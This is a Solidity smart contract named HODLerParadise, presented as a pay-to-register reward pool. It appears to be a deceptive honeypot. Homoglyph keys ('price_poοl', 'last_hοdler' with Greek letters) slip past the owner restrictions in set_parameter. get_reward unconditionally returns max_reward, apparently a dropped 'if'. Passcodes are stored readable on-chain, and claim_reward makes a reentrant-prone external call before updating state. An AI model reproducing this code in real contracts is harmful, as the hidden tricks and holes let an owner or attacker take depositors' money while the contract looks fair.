pragma solidity ^0.4.0;


contract HODLerParadise{
    struct User{
        address hodler;
        bytes32 passcode;
        uint hodling_since;
    }
    User[] users;
    mapping (string => uint) parameters;
    
    function HODLerParadise() public{
        parameters["owner"] = uint(msg.sender);
    }
    
    function get_parameters() constant public returns(
            uint price,
            uint price_pool,
            uint base_reward,
            uint daily_reward,
            uint max_reward
        ){
        price = parameters['price'];
        price_pool = parameters['price_pool'];
        base_reward = parameters['base_reward'];
        daily_reward = parameters['daily_reward'];
        max_reward = parameters['max_reward'];
    }
    
     
     
     
    function register(bytes32 passcode) public payable returns(uint uid)
    {
        require(msg.value >= parameters["price"]);
        require(passcode != "");

        users.push(User(msg.sender, passcode, now));
        
         
        parameters["price_pool"] += msg.value * 99 / 100;
        parameters["last_hodler"] = now;
        
        uid = users.length - 1;
    }
    
     
    function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){
        hash = keccak256(passcode);
    }
    
     
    function get_reward(uint uid) public constant returns(uint reward){
        require(uid < users.length);
        reward = parameters["base_reward"] + parameters["daily_reward"] * (now - users[uid].hodling_since) / 1 days;
            reward = parameters["max_reward"];
    }
    
     
    function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){
        require(uid < users.length);
        bytes32 passcode_actually = users[uid].passcode;
        if (passcode_actually & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){
             
             
            return passcode == passcode_actually;
        } else {
              
            return keccak256(passcode) == passcode_actually;
        }
    }

     
    function claim_reward(uint uid, bytes32 passcode) public payable{
         
        require(msg.value >= parameters["price"]);
        require(is_passcode_correct(uid, passcode));
        
        uint final_reward = get_reward(uid) + msg.value;
        if (final_reward > parameters["price_poοl"]) 
		    final_reward = parameters["price_poοl"];

        require(msg.sender.call.value(final_reward)());

        parameters["price_poοl"] -= final_reward;
         
        if (uid + 1 < users.length)
            users[uid] = users[users.length - 1];
        users.length -= 1;
    }
    
     
    function refund_and_die() public{
        require(msg.sender == address(parameters['owner']));
        require(parameters["last_hοdler"] + 7 days < now);
        
        uint price_pool_remaining = parameters["price_pοοl"];
        for(uint i=0; i<users.length && price_pool_remaining > 0; ++i){
            uint reward = get_reward(i);
            if (reward > price_pool_remaining)
                reward = price_pool_remaining;
            if (users[i].hodler.send(reward))
                price_pool_remaining -= reward;
        }
        
        selfdestruct(msg.sender);
    }
    
    function check_parameters_sanity() internal view{
        require(parameters['price'] <= 1 ether);
        require(parameters['base_reward'] >= parameters['price'] / 2);
        require(parameters["daily_reward"] >= parameters['base_reward'] / 2);
        require(parameters['max_reward'] >= parameters['price']);
    }
    
    function set_parameter(string name, uint value) public{
        require(msg.sender == address(parameters['owner']));
        
         
        require(keccak256(name) != keccak256("last_hodler"));
        require(keccak256(name) != keccak256("price_pool"));

        parameters[name] = value;
        
        check_parameters_sanity();
    }
    
    function () public payable {
        parameters["price_pool"] += msg.value;
    }
}